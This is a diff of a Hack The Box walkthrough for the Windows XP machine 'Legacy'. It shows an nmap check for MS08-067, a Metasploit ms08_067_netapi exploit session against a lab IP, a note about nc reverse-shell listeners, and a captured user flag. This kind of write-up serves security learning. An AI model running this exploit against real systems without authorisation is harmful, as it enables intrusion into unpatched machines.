@@ -1,6 +1,6 @@
 This is my write-up/walkthrough for [the Hack The Box machine, Legacy](https://app.hackthebox.com/machines/Legacy). It's a Windows machine, rated "Easy", with 10.10.10.4 as its IP address.
 
-![Alt text](/images/legacy/2022-02-16-hack-the-box-legacy-01.JPG "Legacy Info Card")
+![Alt text](/images/legacy/2022-03-06-hack-the-box-legacy-01.JPG "Legacy Info Card")
 
 I started with an nmap scan—
 
@@ -49,10 +49,10 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 71.02 seconds
 ```
 
-—that told me, more than anything else, this box is running Windows XP with port 445 (SMB) opened. My immediate thought was that there has to be a known vulnerability out there for this, and turned out, there indeed is – [MS08-067](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2008/ms08-067). 
+—that told me, more than anything else, this box is running Windows XP with port 445 (SMB) open. My immediate thought was that there has to be a known vulnerability out there for this, and turned out, there indeed is – [MS08-067](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2008/ms08-067). 
 
 ```
-┌──(kali㉿kali)-[~]
+┌──(thatvirdiguy㉿kali)-[~]
 └─$ nmap -Pn --script smb-vuln-ms08-067.nse 10.10.10.4
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-06 11:58 EST
 Nmap scan report for 10.10.10.4
@@ -84,7 +84,7 @@ Nmap done: 1 IP address (1 host up) scanned in 18.54 seconds
 I then found out [this](https://www.pentestpundit.com/2020/04/exploit-windows-xp-smb-service-ms08-067.html) article that details how to exploit that vulnerability using Metasploit—
 
 ```
-┌──(kali㉿kali)-[~]
+┌──(thatvirdiguy㉿kali)-[~]
 └─$ sudo msfconsole 
                                                   
                                    ___          ____
@@ -287,7 +287,7 @@ msf6 exploit(windows/smb/ms08_067_netapi) > exploit
 msf6 exploit(windows/smb/ms08_067_netapi) >
 ```
 
-—but it wasn't working. It turned out, for this particular exploit, and contrary to the article I had been consulting, you neither need to set `LPORT` nor have an `nc` running on your machine.
+—but it wasn't working. It turned out, for this particular exploit, and contrary to the article I had been consulting, you neither need to set `LPORT` nor have an `nc` listening for reverse shell on your machine.
 
 ```
 msf6 exploit(windows/smb/ms08_067_netapi) > set RHOST 10.10.10.4
@@ -564,5 +564,4 @@ type user.txt
 e69af0e4f443de7e36876fda4ec7644f
 C:\Documents and Settings\john\Desktop>
 ```
-
 
